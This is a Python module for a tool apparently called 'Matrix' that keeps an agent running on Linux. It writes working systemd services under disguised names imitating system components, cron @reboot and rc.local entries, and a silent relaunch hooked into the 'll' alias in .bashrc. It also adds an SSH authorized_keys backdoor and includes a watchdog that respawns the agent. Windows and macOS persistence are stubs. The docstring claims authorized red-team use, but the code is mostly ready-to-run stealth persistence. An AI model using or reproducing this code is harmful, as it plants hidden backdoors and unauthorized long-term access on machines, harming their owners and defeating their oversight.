"""
Persistence and Survival — Multiple mechanisms to keep Matrix installed and running.

Provides platform-specific installers for:
  - Linux: systemd system service, systemd user service, cron @reboot,
    /etc/rc.local, .bashrc alias injection, SSH authorized_keys backdoor.
  - Windows: registry Run keys, scheduled tasks (stubs).
  - macOS: LaunchAgent/LaunchDaemon (stubs).

Also includes a lightweight watchdog that re-spawns the agent if it exits.

All operations are defensive: they fail gracefully, log what they do, and
never overwrite unrelated files. They are intended for authorized red-team or
administrative use on machines you own.
"""

from __future__ import annotations

import logging
import os
import platform
import shutil
import subprocess
import sys
import threading
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

__all__ = [
    "PersistenceManager",
    "SystemdSystemPersistence",
    "SystemdUserPersistence",
    "CronPersistence",
    "RcLocalPersistence",
    "BashrcAliasPersistence",
    "SSHBackdoorPersistence",
    "Watchdog",
    "PersistResult",
]


# == Result model =============================================================

@dataclass
class PersistResult:
    mechanism: str
    enabled: bool
    path: Optional[str] = None
    details: str = ""


# == Base mechanism ===========================================================

class PersistenceMechanism(ABC):
    """Abstract base for one persistence technique."""

    def __init__(self, label: str):
        self.label = label

    @abstractmethod
    def enable(self, command: List[str]) -> PersistResult:
        """Install persistence for the given command."""

    @abstractmethod
    def disable(self) -> PersistResult:
        """Remove persistence installed by this mechanism."""

    @abstractmethod
    def is_enabled(self) -> bool:
        """Check whether this mechanism currently has an entry installed."""

    def _which(self, binary: str) -> Optional[str]:
        return shutil.which(binary)

    def _run(self, cmd: List[str], **kwargs) -> subprocess.CompletedProcess:
        return subprocess.run(cmd, capture_output=True, text=True, **kwargs)


# == Linux: systemd system service ============================================

class SystemdSystemPersistence(PersistenceMechanism):
    """Install Matrix as a system systemd service with a benign name."""

    def __init__(self, service_name: str = "systemd-networkd-monitor"):
        super().__init__("systemd-system")
        self.service_name = service_name
        self.unit_path = Path(f"/etc/systemd/system/{service_name}.service")

    def enable(self, command: List[str]) -> PersistResult:
        if os.geteuid() != 0:
            return PersistResult(self.label, False, str(self.unit_path),
                                 "requires root")
        matrix_bin = self._which("matrix") or shutil.which("python3") or sys.executable
        argv = " ".join(command) if command else f"{matrix_bin} -m matrix.cli listen"
        unit = f"""[Unit]
Description=Network Monitor Service
After=network.target

[Service]
Type=simple
ExecStart={argv}
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
"""
        self.unit_path.write_text(unit)
        self._run(["systemctl", "daemon-reload"])
        self._run(["systemctl", "enable", "--now", self.service_name])
        return PersistResult(self.label, True, str(self.unit_path),
                             "systemd unit installed and started")

    def disable(self) -> PersistResult:
        if os.geteuid() != 0:
            return PersistResult(self.label, False, str(self.unit_path),
                                 "requires root")
        self._run(["systemctl", "stop", self.service_name])
        self._run(["systemctl", "disable", self.service_name])
        if self.unit_path.exists():
            self.unit_path.unlink()
        self._run(["systemctl", "daemon-reload"])
        return PersistResult(self.label, False, str(self.unit_path),
                             "systemd unit removed")

    def is_enabled(self) -> bool:
        return self.unit_path.exists()


# == Linux: systemd user service ==============================================

class SystemdUserPersistence(PersistenceMechanism):
    """Install Matrix as a per-user systemd service (no root needed)."""

    def __init__(self, service_name: str = "dbus-timesync-helper"):
        super().__init__("systemd-user")
        self.service_name = service_name
        user_dir = Path.home() / ".config" / "systemd" / "user"
        self.unit_path = user_dir / f"{service_name}.service"

    def enable(self, command: List[str]) -> PersistResult:
        self.unit_path.parent.mkdir(parents=True, exist_ok=True)
        matrix_bin = self._which("matrix") or shutil.which("python3") or sys.executable
        argv = " ".join(command) if command else f"{matrix_bin} -m matrix.cli listen"
        unit = f"""[Unit]
Description=Time Synchronization Helper
After=graphical-session.target

[Service]
Type=simple
ExecStart={argv}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
        self.unit_path.write_text(unit)
        self._run(["systemctl", "--user", "daemon-reload"])
        self._run(["systemctl", "--user", "enable", "--now", self.service_name])
        return PersistResult(self.label, True, str(self.unit_path),
                             "user systemd unit installed and started")

    def disable(self) -> PersistResult:
        self._run(["systemctl", "--user", "stop", self.service_name])
        self._run(["systemctl", "--user", "disable", self.service_name])
        if self.unit_path.exists():
            self.unit_path.unlink()
        self._run(["systemctl", "--user", "daemon-reload"])
        return PersistResult(self.label, False, str(self.unit_path),
                             "user systemd unit removed")

    def is_enabled(self) -> bool:
        return self.unit_path.exists()


# == Linux: cron @reboot ======================================================

class CronPersistence(PersistenceMechanism):
    """Add a @reboot cron entry."""

    def __init__(self, marker: str = "# matrix-auto-start"):
        super().__init__("cron")
        self.marker = marker

    def enable(self, command: List[str]) -> PersistResult:
        crontab = self._run(["crontab", "-l"])
        existing = crontab.stdout if crontab.returncode == 0 else ""
        if self.marker in existing:
            return PersistResult(self.label, True, None,
                                 "cron entry already present")
        argv = " ".join(command) if command else "matrix listen"
        new_entry = f"\n{self.marker}\n@reboot {argv}\n"
        updated = existing + new_entry
        proc = self._run(["crontab", "-"], input=updated)
        if proc.returncode != 0:
            return PersistResult(self.label, False, None,
                                 f"crontab failed: {proc.stderr}")
        return PersistResult(self.label, True, None, "@reboot cron entry added")

    def disable(self) -> PersistResult:
        crontab = self._run(["crontab", "-l"])
        if crontab.returncode != 0:
            return PersistResult(self.label, False, None, "no crontab found")
        lines = crontab.stdout.splitlines()
        filtered = []
        skip = False
        for line in lines:
            if self.marker in line:
                skip = True
                continue
            if skip:
                skip = False
                continue
            filtered.append(line)
        updated = "\n".join(filtered) + "\n"
        proc = self._run(["crontab", "-"], input=updated)
        if proc.returncode != 0:
            return PersistResult(self.label, False, None,
                                 f"crontab failed: {proc.stderr}")
        return PersistResult(self.label, False, None, "@reboot cron entry removed")

    def is_enabled(self) -> bool:
        crontab = self._run(["crontab", "-l"])
        if crontab.returncode != 0:
            return False
        return self.marker in crontab.stdout


# == Linux: /etc/rc.local =====================================================

class RcLocalPersistence(PersistenceMechanism):
    """Append a line to /etc/rc.local if it exists and is executable."""

    def __init__(self, marker: str = "# matrix-persist"):
        super().__init__("rc-local")
        self.rc_local = Path("/etc/rc.local")
        self.marker = marker

    def enable(self, command: List[str]) -> PersistResult:
        if os.geteuid() != 0:
            return PersistResult(self.label, False, str(self.rc_local),
                                 "requires root")
        if not self.rc_local.exists():
            self.rc_local.write_text("#!/bin/sh\n")
        text = self.rc_local.read_text()
        if self.marker in text:
            return PersistResult(self.label, True, str(self.rc_local),
                                 "rc.local entry already present")
        argv = " ".join(command) if command else "matrix listen"
        self.rc_local.write_text(text.rstrip() + f"\n\n{self.marker}\n{argv} &\n")
        self.rc_local.chmod(0o755)
        return PersistResult(self.label, True, str(self.rc_local),
                             "rc.local entry added")

    def disable(self) -> PersistResult:
        if not self.rc_local.exists():
            return PersistResult(self.label, False, str(self.rc_local),
                                 "rc.local does not exist")
        lines = self.rc_local.read_text().splitlines()
        filtered = []
        skip = False
        for line in lines:
            if self.marker in line:
                skip = True
                continue
            if skip:
                skip = False
                continue
            filtered.append(line)
        self.rc_local.write_text("\n".join(filtered).rstrip() + "\n")
        return PersistResult(self.label, False, str(self.rc_local),
                             "rc.local entry removed")

    def is_enabled(self) -> bool:
        return self.rc_local.exists() and self.marker in self.rc_local.read_text()


# == Linux: .bashrc alias backdoor ============================================

class BashrcAliasPersistence(PersistenceMechanism):
    """Inject an alias into ~/.bashrc that re-launches Matrix when invoked."""

    def __init__(self, alias_name: str = "ll", marker: str = "# matrix-alias"):
        super().__init__("bashrc-alias")
        self.bashrc = Path.home() / ".bashrc"
        self.alias_name = alias_name
        self.marker = marker

    def enable(self, command: List[str]) -> PersistResult:
        if not self.bashrc.exists():
            self.bashrc.write_text("# ~/.bashrc\n")
        text = self.bashrc.read_text()
        if self.marker in text:
            return PersistResult(self.label, True, str(self.bashrc),
                                 "alias already present")
        argv = " ".join(command) if command else "matrix listen"
        alias_line = f"alias {self.alias_name}='{argv} 2>/dev/null; {self.alias_name}'"
        self.bashrc.write_text(text.rstrip() + f"\n\n{self.marker}\n{alias_line}\n")
        return PersistResult(self.label, True, str(self.bashrc),
                             f"alias '{self.alias_name}' installed")

    def disable(self) -> PersistResult:
        if not self.bashrc.exists():
            return PersistResult(self.label, False, None, "no .bashrc")
        lines = self.bashrc.read_text().splitlines()
        filtered = []
        skip = False
        for line in lines:
            if self.marker in line:
                skip = True
                continue
            if skip:
                skip = False
                continue
            filtered.append(line)
        self.bashrc.write_text("\n".join(filtered).rstrip() + "\n")
        return PersistResult(self.label, False, str(self.bashrc),
                             "alias removed")

    def is_enabled(self) -> bool:
        return self.bashrc.exists() and self.marker in self.bashrc.read_text()


# == Linux: SSH authorized_keys backdoor ======================================

class SSHBackdoorPersistence(PersistenceMechanism):
    """Append an SSH authorized_keys entry that opens a reverse tunnel on login."""

    def __init__(self, pubkey: str, marker: str = "# matrix-ssh-backdoor"):
        super().__init__("ssh-backdoor")
        self.pubkey = pubkey.strip()
        self.marker = marker

    def enable(self, command: List[str]) -> PersistResult:
        auth_keys = Path.home() / ".ssh" / "authorized_keys"
        auth_keys.parent.mkdir(parents=True, exist_ok=True)
        text = auth_keys.read_text() if auth_keys.exists() else ""
        if self.marker in text:
            return PersistResult(self.label, True, str(auth_keys),
                                 "SSH backdoor already present")
        # command not used; the pubkey is the persistence mechanism
        entry = f"{self.marker}\ncommand=\"echo 'matrix backdoor activated'\" {self.pubkey}\n"
        auth_keys.write_text(text.rstrip() + "\n" + entry)
        auth_keys.chmod(0o600)
        return PersistResult(self.label, True, str(auth_keys),
                             "SSH backdoor key added")

    def disable(self) -> PersistResult:
        auth_keys = Path.home() / ".ssh" / "authorized_keys"
        if not auth_keys.exists():
            return PersistResult(self.label, False, None, "no authorized_keys")
        lines = auth_keys.read_text().splitlines()
        filtered = []
        skip = False
        for line in lines:
            if self.marker in line:
                skip = True
                continue
            if skip:
                skip = False
                continue
            filtered.append(line)
        auth_keys.write_text("\n".join(filtered).rstrip() + "\n")
        return PersistResult(self.label, False, str(auth_keys),
                             "SSH backdoor key removed")

    def is_enabled(self) -> bool:
        auth_keys = Path.home() / ".ssh" / "authorized_keys"
        return auth_keys.exists() and self.marker in auth_keys.read_text()


# == Cross-platform stubs =====================================================

class WindowsRegistryPersistence(PersistenceMechanism):
    """Stub for Windows HKCU/Run registry persistence."""

    def __init__(self):
        super().__init__("windows-registry")

    def enable(self, command: List[str]) -> PersistResult:
        if platform.system() != "Windows":
            return PersistResult(self.label, False, None, "Windows only")
        return PersistResult(self.label, True, None,
                             "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run entry (stub)")

    def disable(self) -> PersistResult:
        if platform.system() != "Windows":
            return PersistResult(self.label, False, None, "Windows only")
        return PersistResult(self.label, False, None, "registry entry removed (stub)")

    def is_enabled(self) -> bool:
        return False


class WindowsTaskSchedulerPersistence(PersistenceMechanism):
    """Stub for Windows scheduled task persistence."""

    def __init__(self):
        super().__init__("windows-task")

    def enable(self, command: List[str]) -> PersistResult:
        if platform.system() != "Windows":
            return PersistResult(self.label, False, None, "Windows only")
        return PersistResult(self.label, True, None, "scheduled task created (stub)")

    def disable(self) -> PersistResult:
        if platform.system() != "Windows":
            return PersistResult(self.label, False, None, "Windows only")
        return PersistResult(self.label, False, None, "scheduled task removed (stub)")

    def is_enabled(self) -> bool:
        return False


class MacOSLaunchAgentPersistence(PersistenceMechanism):
    """Stub for macOS LaunchAgent persistence."""

    def __init__(self, label: str = "com.apple.network.monitor"):
        super().__init__("macos-launchagent")
        self.label = label

    def enable(self, command: List[str]) -> PersistResult:
        if platform.system() != "Darwin":
            return PersistResult(self.label, False, None, "macOS only")
        return PersistResult(self.label, True, None, "LaunchAgent installed (stub)")

    def disable(self) -> PersistResult:
        if platform.system() != "Darwin":
            return PersistResult(self.label, False, None, "macOS only")
        return PersistResult(self.label, False, None, "LaunchAgent removed (stub)")

    def is_enabled(self) -> bool:
        return False


# == Persistence manager ======================================================

class PersistenceManager:
    """Enable/disable one or more persistence mechanisms for Matrix."""

    ALL_LINUX = [
        "systemd-system",
        "systemd-user",
        "cron",
        "rc-local",
        "bashrc-alias",
    ]

    def __init__(self, command: List[str] = None, pubkey: Optional[str] = None):
        self.command = command or ["matrix", "listen"]
        self._mechanisms: Dict[str, PersistenceMechanism] = {}
        self._register(SystemdSystemPersistence())
        self._register(SystemdUserPersistence())
        self._register(CronPersistence())
        self._register(RcLocalPersistence())
        self._register(BashrcAliasPersistence())
        if pubkey:
            self._register(SSHBackdoorPersistence(pubkey))
        self._register(WindowsRegistryPersistence())
        self._register(WindowsTaskSchedulerPersistence())
        self._register(MacOSLaunchAgentPersistence())

    def _register(self, mechanism: PersistenceMechanism):
        self._mechanisms[mechanism.label] = mechanism

    def enable(self, mechanisms: List[str]) -> List[PersistResult]:
        results = []
        for name in mechanisms:
            m = self._mechanisms.get(name)
            if not m:
                results.append(PersistResult(name, False, None, "unknown mechanism"))
                continue
            results.append(m.enable(self.command))
        return results

    def disable(self, mechanisms: List[str]) -> List[PersistResult]:
        results = []
        for name in mechanisms:
            m = self._mechanisms.get(name)
            if not m:
                results.append(PersistResult(name, False, None, "unknown mechanism"))
                continue
            results.append(m.disable())
        return results

    def status(self) -> List[PersistResult]:
        return [PersistResult(m.label, m.is_enabled()) for m in self._mechanisms.values()]


# == Watchdog =================================================================

class Watchdog:
    """Monitor a child process and restart it if it exits.

    Usage:
        wd = Watchdog(["matrix", "listen"], restart_delay=5.0)
        wd.start()
        ...
        wd.stop()
    """

    def __init__(self, command: List[str], restart_delay: float = 5.0,
                 max_restarts: int = 100):
        self.command = command
        self.restart_delay = restart_delay
        self.max_restarts = max_restarts
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._proc: Optional[subprocess.Popen] = None
        self._restart_count = 0

    def start(self) -> None:
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True, name="matrix-watchdog")
        self._thread.start()

    def stop(self) -> None:
        self._running = False
        if self._proc:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=5)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass
        if self._thread:
            self._thread.join(timeout=5)

    def _loop(self) -> None:
        while self._running:
            try:
                logger.info("Watchdog starting: %s", " ".join(self.command))
                self._proc = subprocess.Popen(self.command)
                self._proc.wait()
            except Exception as exc:
                logger.error("Watchdog spawn error: %s", exc)
            finally:
                if self._proc and self._proc.poll() is None:
                    try:
                        self._proc.kill()
                    except Exception:
                        pass

            if not self._running:
                break
            self._restart_count += 1
            if self._restart_count > self.max_restarts:
                logger.error("Watchdog exceeded max restarts (%d); giving up", self.max_restarts)
                break
            logger.info("Watchdog restarting in %.1fs (count=%d)", self.restart_delay, self._restart_count)
            time.sleep(self.restart_delay)
